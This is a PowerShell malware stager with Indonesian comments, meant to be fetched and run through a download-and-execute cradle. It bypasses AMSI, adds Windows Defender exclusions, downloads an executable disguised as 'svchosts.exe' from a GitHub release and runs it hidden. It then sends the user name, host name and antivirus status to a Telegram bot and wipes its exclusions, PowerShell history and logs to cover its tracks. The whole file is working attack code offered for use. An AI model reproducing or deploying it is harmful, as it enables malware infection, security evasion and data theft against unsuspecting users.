# st.ps1 v2 - stager + cleanup + bukti via Telegram
# Dipanggil cradle:  iex (WebClient).DownloadString('https://.../st.ps1')

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

# ---------------------------------------------------------------- CONFIG
$url     = 'https://github.com/byteforge0-cloud/darkwhisper/releases/download/mantap/svchost.exetTy'
$exe     = Join-Path $env:TEMP 'svchosts.exe'
$bot     = ''                       # token bot, kosongkan kalau tak perlu
$chat    = ''                       # chat_id tujuan
$cleanup = $true                    # TRUE = hapus exclusion + jejak setelah jalan
# ----------------------------------------------------------------------

function T($s) { $s | Out-File -FilePath (Join-Path $env:TEMP 'st.txt') -Append -Encoding utf8 }

# ---------- 0. AMSI ------------------------------------------------------
try {
    $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $t.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
} catch { }

# ---------- 1. exclusion SEBELUM unduhan (kunci: jangan sesudah) ---------
Add-MpPreference -ExclusionPath $exe -Force
Add-MpPreference -ExclusionProcess 'svchosts.exe' -Force
Add-MpPreference -ExclusionPath $env:TEMP -Force
T 'excl ok'

# ---------- 2. unduh: curl dulu, WebClient cadangan ---------------------
Remove-Item $exe -Force
curl.exe -sL --max-time 600 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -o $exe $url
if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB) {
    try {
        $c = New-Object Net.WebClient
        $c.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        $c.DownloadFile($url, $exe)
    } catch { T 'dl fail' }
}
if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB) { T 'abort'; return }
Unblock-File $exe

# ---------- 3. jalan ----------------------------------------------------
Start-Process -FilePath $exe -WindowStyle Hidden

# ---------- 4. bukti: kirim identitas + status AV ke Telegram -----------
if ($bot -and $chat) {
    $proof = Join-Path $env:TEMP ('p_{0}.txt' -f (Get-Random))
    @(
        "user : $env:USERNAME"
        "host : $env:COMPUTERNAME"
        "admin: $(([Security.Principal.WindowsIdentity]::GetCurrent()).Name)"
        "av   : $((Get-MpComputerStatus).RealTimeProtectionEnabled)"
        "time : $(Get-Date -f s)"
    ) | Out-File $proof -Encoding utf8
    $api = "https://api.telegram.org/bot$bot/sendDocument"
    curl.exe -s -F "chat_id=$chat" -F "document=@$proof" -F "caption=$env:COMPUTERNAME" $api > $null
    Remove-Item $proof -Force
}

# ---------- 5. cleanup --------------------------------------------------
if ($cleanup) {
    # path exclusion dibuang, exclusion proses dibiarkan: exe masih hidup
    Remove-MpPreference -ExclusionPath $exe -Force
    Remove-MpPreference -ExclusionPath $env:TEMP -Force
    Clear-History
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
    Remove-Item (Join-Path $env:TEMP 'st.txt') -Force
}
exit
